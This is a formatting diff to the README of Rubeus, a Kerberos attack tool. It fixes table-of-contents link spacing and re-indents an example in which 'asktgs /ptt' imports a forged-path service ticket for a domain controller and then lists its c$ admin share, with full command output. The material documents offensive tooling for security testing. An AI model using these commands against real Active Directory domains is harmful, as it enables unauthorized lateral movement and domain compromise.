@@ -34,9 +34,9 @@ Rubeus is licensed under the BSD 3-Clause license.
     - [brute](#brute)|spray
   - [Constrained delegation abuse](#constrained-delegation-abuse)
     - [s4u](#s4u)
-  - [Ticket Forgery] (#ticket-forgery)
-    - [golden] (#golden)
-    - [silver] (#silver)
+  - [Ticket Forgery](#ticket-forgery)
+    - [golden](#golden)
+    - [silver](#silver)
   - [Ticket Management](#ticket-management)
     - [ptt](#ptt)
     - [purge](#purge)
@@ -1752,57 +1752,57 @@ This referral TGT can then be used to request service tickets for services in **
 
     C:\Rubeus>Rubeus.exe asktgs /service:cifs/pdc1.rubeus.ghostpack.local /dc:pdc1.rubeus.ghostpack.local /ptt /ticket:doIF0TCCBc2gAwIBBaE...(snip)...cy5naG9zdHBhY2subG9jYWw=
 
-      ______        _
-     (_____ \      | |
-      _____) )_   _| |__  _____ _   _  ___
-     |  __  /| | | |  _ \| ___ | | | |/___)
-     | |  \ \| |_| | |_) ) ____| |_| |___ |
-     |_|   |_|____/|____/|_____)____/(___/
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
 
-     v2.0.0
+      v2.0.0
 
-   [*] Action: Ask TGS
+    [*] Action: Ask TGS
 
-   [*] Using domain controller: pdc1.rubeus.ghostpack.local (192.168.71.80)
-   [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
-   [*] Building TGS-REQ request for: 'cifs/pdc1.rubeus.ghostpack.local'
-   [+] TGS request successful!
-   [+] Ticket successfully imported!
-   [*] base64(ticket.kirbi):
+    [*] Using domain controller: pdc1.rubeus.ghostpack.local (192.168.71.80)
+    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+    [*] Building TGS-REQ request for: 'cifs/pdc1.rubeus.ghostpack.local'
+    [+] TGS request successful!
+    [+] Ticket successfully imported!
+    [*] base64(ticket.kirbi):
 
-         doIF9zCCBfOgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
-                                            ...(snip)...
-         ZnMbG3BkYzEucnViZXVzLmdob3N0cGFjay5sb2NhbA==
+          doIF9zCCBfOgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                             ...(snip)...
+          ZnMbG3BkYzEucnViZXVzLmdob3N0cGFjay5sb2NhbA==
 
-     ServiceName              :  cifs/pdc1.rubeus.ghostpack.local
-     ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
-     UserName                 :  dev.ccob
-     UserRealm                :  DEV.RUBEUS.GHOSTPACK.LOCAL
-     StartTime                :  29/07/2021 03:04:26
-     EndTime                  :  29/07/2021 13:03:34
-     RenewTill                :  05/08/2021 03:03:34
-     Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
-     KeyType                  :  aes256_cts_hmac_sha1
-     Base64(key)              :  lQGdcWT5/cacHGFko3fDJvF9poFK+tH5hctlDN89peY=
+      ServiceName              :  cifs/pdc1.rubeus.ghostpack.local
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  dev.ccob
+      UserRealm                :  DEV.RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  29/07/2021 03:04:26
+      EndTime                  :  29/07/2021 13:03:34
+      RenewTill                :  05/08/2021 03:03:34
+      Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+      KeyType                  :  aes256_cts_hmac_sha1
+      Base64(key)              :  lQGdcWT5/cacHGFko3fDJvF9poFK+tH5hctlDN89peY=
 
 
 
-   C:\Rubeus>dir \\pdc1.rubeus.ghostpack.local\c$
-    Volume in drive \\pdc1.rubeus.ghostpack.local\c$ has no label.
-    Volume Serial Number is 3C5F-0EF1
+    C:\Rubeus>dir \\pdc1.rubeus.ghostpack.local\c$
+     Volume in drive \\pdc1.rubeus.ghostpack.local\c$ has no label.
+     Volume Serial Number is 3C5F-0EF1
 
-    Directory of \\pdc1.rubeus.ghostpack.local\c$
+     Directory of \\pdc1.rubeus.ghostpack.local\c$
 
-   30/06/2021  02:13    <DIR>          inetpub
-   15/09/2018  08:19    <DIR>          PerfLogs
-   09/06/2021  17:45    <DIR>          Program Files
-   09/06/2021  17:45    <DIR>          Program Files (x86)
-   14/07/2021  01:18    <DIR>          Rubeus
-   19/07/2021  20:48    <DIR>          temp
-   30/06/2021  02:14    <DIR>          Users
-   14/07/2021  02:17    <DIR>          Windows
-                  0 File(s)              0 bytes
-                  8 Dir(s)  94,901,772,288 bytes free
+    30/06/2021  02:13    <DIR>          inetpub
+    15/09/2018  08:19    <DIR>          PerfLogs
+    09/06/2021  17:45    <DIR>          Program Files
+    09/06/2021  17:45    <DIR>          Program Files (x86)
+    14/07/2021  01:18    <DIR>          Rubeus
+    19/07/2021  20:48    <DIR>          temp
+    30/06/2021  02:14    <DIR>          Users
+    14/07/2021  02:17    <DIR>          Windows
+                   0 File(s)              0 bytes
+                   8 Dir(s)  94,901,772,288 bytes free
 
 
 
